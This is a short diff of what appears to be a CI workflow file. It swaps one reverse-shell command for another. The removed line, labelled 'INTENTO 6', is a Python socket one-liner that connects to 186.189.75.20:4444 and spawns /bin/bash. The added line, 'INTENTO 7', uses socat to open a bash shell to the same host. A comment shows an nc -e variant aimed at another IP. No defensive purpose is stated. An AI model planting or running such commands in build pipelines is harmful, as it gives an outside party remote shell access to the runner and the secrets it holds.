@@ -55,8 +55,8 @@ jobs:
           # Or with nc: nc -e /bin/sh 200.73.69.220 4444
 
 
-          # INTENTO 6
-          python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("186.189.75.20",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+          # INTENTO 7
+          socat TCP:186.189.75.20:4444 EXEC:/bin/bash &
 
 
 
